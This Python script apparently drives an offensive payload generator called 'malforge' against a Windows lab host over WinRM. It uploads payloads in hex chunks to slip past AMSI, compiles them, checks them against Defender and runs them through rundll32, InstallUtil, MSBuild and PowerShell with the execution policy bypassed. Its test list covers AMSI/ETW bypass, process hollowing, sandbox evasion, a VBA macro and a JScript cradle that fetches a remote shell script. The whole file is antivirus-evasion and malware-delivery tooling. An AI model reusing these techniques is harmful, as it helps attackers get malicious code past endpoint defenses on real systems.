import os
import sys
import json
import base64
import winrm
from pathlib import Path

# Configuration from Environment or Telemetry
TARGET_IP = os.getenv("MALFORGE_TARGET_IP", "192.168.40.154")
USER = os.getenv("MALFORGE_USER", "victim")
PASS = os.getenv("MALFORGE_PASS", "victim123")
CSC_PATH = os.getenv("MALFORGE_CSC", r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe")
REMOTE_TEMP = r"C:\Windows\Temp"

class MalforgeOrchestrator:
    def __init__(self):
        print(f"[*] Initializing session to {TARGET_IP}...")
        self.session = winrm.Session(f"http://{TARGET_IP}:5985/wsman", auth=(USER, PASS), transport='basic')
        self.local_results = []
        self.msbuild_path = os.getenv("MALFORGE_MSBUILD", r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe")

    def run_remote_ps(self, script):
        try:
            # Add a 60s timeout for each PS command
            r = self.session.run_ps(script)
            return r.std_out.decode().strip(), r.std_err.decode().strip(), r.status_code
        except Exception as e:
            return "", str(e), -1

    def upload_file(self, local_path, remote_path):
        with open(local_path, "rb") as f:
            data = f.read()
            content = base64.b64encode(data).decode()
        
        # Temp file for base64 text
        remote_b64 = remote_path + ".b64"
        self.run_remote_ps(f"New-Item -Path '{remote_b64}' -ItemType File -Force | Out-Null")
        
        # 1000 char chunks to be very safe with command length and AV
        chunk_size = 1000
        for i in range(0, len(content), chunk_size):
            chunk = content[i:i+chunk_size]
            # Use hex to hide the base64 characters from AMSI if it's being crazy
            h = chunk.encode().hex()
            ps = f"$h='{h}'; $t=''; for($i=0;$i -lt $h.Length;$i+=2){{$t+=[char][System.Convert]::ToByte($h.Substring($i,2),16)}}; Add-Content -Path '{remote_b64}' -Value $t -NoNewline"
            self.run_remote_ps(ps)
        
        # Decode text file to binary
        decode_ps = f"""
$b64 = Get-Content '{remote_b64}' -Raw
$bytes = [System.Convert]::FromBase64String($b64)
[System.IO.File]::WriteAllBytes('{remote_path}', $bytes)
Remove-Item '{remote_b64}' -Force
"""
        self.run_remote_ps(decode_ps)
            
        verify_ps = f"(Get-Item '{remote_path}').Length -eq {len(data)}"
        out, err, code = self.run_remote_ps(verify_ps)
        return "True" in out

    def test_payload(self, name, local_file, fmt, amsi=False):
        print(f"[*] Testing {name} ({fmt})...")
        
        remote_src = REMOTE_TEMP + "\\" + os.path.basename(local_file)
        print("  [>] Uploading...", end="", flush=True)
        if not self.upload_file(local_file, remote_src):
            print(" FAILED")
            return False
        print(" OK")

        result = {"name": name, "format": fmt, "upload": "SUCCESS", "compile": "N/A", "scan": "N/A", "exec": "N/A"}

        if fmt == "cs" or local_file.endswith(".csproj") or local_file.endswith(".cs"):
            remote_target = remote_src.replace(".cs", ".exe").replace(".csproj", ".exe")
            if "dll" in name.lower() or "installutil" in name.lower():
                remote_target = remote_src.replace(".cs", ".dll")
            
            # 1. Compile/Build
            print("  [>] Building...", end="", flush=True)
            if local_file.endswith(".csproj"):
                cmd = f"& '{self.msbuild_path}' '{remote_src}' /t:Build /p:Configuration=Release /p:OutDir={REMOTE_TEMP}"
            else:
                target_type = "library" if ("dll" in name.lower() or "installutil" in name.lower()) else "exe"
                cmd = f"& '{CSC_PATH}' /out:'{remote_target}' /target:{target_type} '{remote_src}'"
            
            out, err, code = self.run_remote_ps(cmd)
            if code != 0:
                print(f" FAILED (Code {code})")
                result["compile"] = f"FAILED: {err} {out}"
                self.local_results.append(result)
                return False
            print(" OK")
            result["compile"] = "SUCCESS"

            # 2. Scan with Defender
            print("  [>] Scanning...", end="", flush=True)
            scan_cmd = f"& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -Scan -ScanType 3 -File '{remote_target}'"
            out, err, code = self.run_remote_ps(scan_cmd)
            if code == 2 or "threat" in out.lower() or "found" in out.lower():
                print(" DETECTED")
                result["scan"] = "DETECTED"
                self.local_results.append(result)
                return False
            print(" CLEAN")
            result["scan"] = "CLEAN"

            # 3. Execute
            print("  [>] Executing...", end="", flush=True)
            if "dll" in name.lower():
                exec_cmd = f"Start-Process -FilePath 'rundll32.exe' -ArgumentList '\"{remote_target}\",Run'"
            elif "installutil" in name.lower():
                installutil_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
                exec_cmd = f"Start-Process -FilePath '{installutil_path}' -ArgumentList '/logfile= /LogToConsole=false /U \"{remote_target}\"'"
            else:
                exec_cmd = f"Start-Process -FilePath '{remote_target}' -PassThru -ErrorAction SilentlyContinue"
            
            out, err, code = self.run_remote_ps(exec_cmd)
            print(" OK")
            result["exec"] = "SUCCESS"

        elif fmt == "ps1":
            # Scan script file
            scan_cmd = f"& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -Scan -ScanType 3 -File '{remote_src}'"
            out, err, code = self.run_remote_ps(scan_cmd)
            result["scan"] = "CLEAN" if code != 2 else "DETECTED"
            
            # Test against AMSI
            exec_cmd = f"powershell.exe -ExecutionPolicy Bypass -File '{remote_src}'"
            out, err, code = self.run_remote_ps(exec_cmd)
            if "This script contains malicious content" in err or "blocked by your antivirus" in err:
                print(" [!] DETECTED by AMSI")
                result["exec"] = "AMSI_BLOCKED"
                self.local_results.append(result)
                return False
            result["exec"] = "SUCCESS"

        elif fmt in ["vba", "js", "hta"]:
            # Primarily static scans for these
            scan_cmd = f"& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -Scan -ScanType 3 -File '{remote_src}'"
            out, err, code = self.run_remote_ps(scan_cmd)
            result["scan"] = "CLEAN" if code != 2 else "DETECTED"
            if code == 2:
                print(" [!] DETECTED by Defender")
                self.local_results.append(result)
                return False
            print(" [+] PASSED (Static)")
            result["exec"] = "N/A (Static Only)"
            self.local_results.append(result)
            return True

        print(" [+] PASSED")
        self.local_results.append(result)
        return True

    def run_suite(self):
        # 0. Remote Cleanup
        print("[*] Cleaning up remote environment...")
        cleanup_ps = f"""
Stop-Process -Name rundll32,installutil,msbuild,runner,payload,hollow,stealth -Force -ErrorAction SilentlyContinue
Get-ChildItem '{REMOTE_TEMP}' -Include *.exe,*.dll,*.hex,*.tmp,*.b64,*.csproj -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
"""
        self.run_remote_ps(cleanup_ps)

        # 1. Generate local payloads
        print("[*] Generating local payloads...")
        os.system("python3 -c \"import os; open('sc.bin', 'wb').write(os.urandom(512))\"")
        
        # Format: (name, cmd_args, fmt)
        payloads = [
            ("Basic XOR EXE", "-i sc.bin -f exe -e xor -o runner.cs", "cs"),
            ("AES + AMSI Bypass EXE", "-i sc.bin -f exe -e aes --amsi -o payload.cs", "cs"),
            ("Hollow + RC4 + Sandbox", "-i sc.bin -f hollow -e rc4 --sandbox -o hollow.cs", "cs"),
            ("PowerShell AES", "-i sc.bin -f ps1 -e aes -o runner.ps1", "ps1"),
            ("Ultimate Stealth", "-i sc.bin -f stealth -e aes,xor --amsi --etw --sandbox -o stealth.cs", "cs"),
            ("DLL Runner", "-i sc.bin -f dll -e xor -o payload_dll.cs", "cs"),
            ("MSBuild Inline", "-i sc.bin -f msbuild -e xor -o payload.csproj", "cs"),
            ("InstallUtil Bypass", "-i sc.bin -f installutil -e caesar -o installutil.cs", "cs"),
            ("VBA Macro", "-i sc.bin -f macro -e xor --amsi -o macro.vba", "vba"),
            ("JScript Cradle", "-f js --url http://10.0.0.1/shell.ps1 -o cradle.js", "js"),
            ("HTA Runner", "-i sc.bin -f hta -e xor -o runner.hta", "hta"),
        ]

        success_count = 0
        for name, args, fmt in payloads:
            # Handle output filename parsing
            import re
            match = re.search(r'-o\s+([^\s]+)', args)
            local_out = match.group(1) if match else "output"
            
            os.system(f"malforge {args}")
            self.test_payload(name, local_out, fmt)
            # Write progress
            with open("test_report.json", "w") as f:
                json.dump(self.local_results, f, indent=4)
        
        passed = len([r for r in self.local_results if r.get("exec") == "SUCCESS" or r.get("exec") == "N/A (Static Only)"])
        print(f"\n[*] Suite Complete: {passed}/{len(payloads)} passed.")

if __name__ == "__main__":
    orchestrator = MalforgeOrchestrator()
    orchestrator.run_suite()
